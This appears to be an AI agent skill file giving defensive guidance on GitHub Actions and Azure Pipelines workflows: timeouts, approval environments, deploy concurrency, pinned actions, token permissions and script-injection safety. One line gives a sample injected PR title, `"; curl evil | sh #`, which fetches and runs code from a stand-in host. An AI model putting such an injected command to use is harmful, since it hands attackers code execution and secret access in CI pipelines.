---
name: ci-pipelines
description: Write and review CI/CD pipelines that fail cleanly, deploy in the intended order, and don't leak secrets - job timeouts that outlast the tools they run, one approval environment per deployment, deploy concurrency, pinned actions, least-privilege tokens, and script-injection-safe run steps. Use this skill whenever you create, edit, or review a GitHub Actions workflow (.github/workflows/*.yml), an Azure Pipelines file (azure-pipelines.yml or pipeline templates), or any deploy, release, or infrastructure-apply pipeline, and whenever approvals, environments, timeouts, or pipeline permissions come up.
---

# CI/CD pipelines

A pipeline is the last thing between a change and production, so it should
fail in a way that leaves nothing half-done, deploy in the order people
approved, and give a compromised dependency as little as possible.

## Workflow

1. **Look first.** Read the existing workflows, reusable workflows or
   templates, and how the repo runs its checks locally. Match them.
2. **Keep logic out of YAML.** A step should call the same command a
   contributor runs locally (`mise run ci`, `make check`) rather than
   inline a long script that only CI can run. The `mise-tasks` skill covers
   building that entry point; a multi-line `run:` block that remains
   follows the `bash` skill.
3. **Lint**: `actionlint` for GitHub Actions (it also runs shellcheck on
   `run:` blocks when shellcheck is installed). Fix findings; don't add
   suppressions without the user's approval.
4. **Check the rules below**, then push to a branch and watch the run.
   Never apply infrastructure from a laptop to test a pipeline change.

## Job timeouts must exceed tool timeouts

Set a job's timeout above the longest timeout of the tool it runs, and
comment the reason next to the setting. OpenTofu/Terraform provider
resource timeouts are often 60 minutes; database migrations and image
builds have their own. If the runner kills the job first, the tool can't
fail cleanly: state stays locked and half-applied changes go unrecorded.

<!-- markdownlint-disable MD013 -->
| Platform        | Setting                         | Default                                                          |
| --------------- | ------------------------------- | ---------------------------------------------------------------- |
| GitHub Actions  | `timeout-minutes` (job or step) | 360 minutes                                                      |
| Azure Pipelines | `timeoutInMinutes` (job)        | 60 minutes; free Microsoft-hosted agents cap private repos at 60 |
<!-- markdownlint-enable MD013 -->

The Azure Pipelines default equals a common 60-minute provider timeout, so
a long apply there needs an explicit, larger `timeoutInMinutes` (and an
agent that allows it).

```yaml
jobs:
  apply:
    # Above the provider's 60-minute resource timeouts, so tofu fails cleanly
    # and releases the state lock instead of being killed mid-apply.
    timeout-minutes: 90
```

## One approval environment per deployment (GitHub Actions)

Give each deployment that needs its own approval its own GitHub
environment. When several jobs in one run wait on the same environment, a
single review approves them all, so dev, uat and prod would apply together
and the promotion order is lost. Share an environment only between jobs
that are meant to be approved as one.

```yaml
deploy-uat:
  environment: uat
deploy-prod:
  needs: deploy-uat
  environment: prod
```

## Don't cancel deploys mid-flight

Two applies racing on the same state, or a newer run cancelling an apply
halfway, cause the same damage as a timeout. Serialize deploys per target
with a concurrency group and leave `cancel-in-progress` off:

```yaml
concurrency:
  group: deploy-prod
  cancel-in-progress: false
```

A new run then waits for the running one. GitHub keeps only one pending run
per group and cancels older pending ones, which is what you want for
deploys of the latest commit. `cancel-in-progress: true` is fine for
checks on pull requests, where a newer push makes the old run pointless.

## Supply chain and secrets

- **Pin third-party actions to a full commit SHA** with the version in a
  comment (`uses: actions/checkout@<sha> # v7.0.1`). A tag can be moved to
  malicious code; a SHA can't. Let Dependabot or Renovate bump the pins.
- **Least-privilege tokens.** Set `permissions: contents: read` at the
  workflow level and widen per job only where needed (`id-token: write`
  for OIDC, `pull-requests: write` to comment). Prefer OIDC federation to
  cloud providers over long-lived secrets.
- **Never interpolate untrusted input into `run:`.** `${{ }}` is expanded
  into the script before the shell runs, so a PR title or branch name like
  `"; curl evil | sh #` becomes code. Pass it through `env:` and quote it:

  ```yaml
  - env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: echo "Title: $PR_TITLE"
  ```

- **Treat `pull_request_target` and `workflow_run` as privileged.** They run
  with secrets and a write token, so never check out and run the PR's code
  in them.

## Checklist before you finish

- [ ] Every job running a long tool has a timeout above that tool's, with a
      comment
- [ ] Each separately approved deployment has its own environment
- [ ] Deploys serialized per target with `cancel-in-progress: false`
- [ ] Actions pinned to SHAs; `permissions` least-privilege
- [ ] No `${{ }}` of untrusted input inside `run:`
- [ ] Steps call the repo's local entry point; linted with `actionlint`
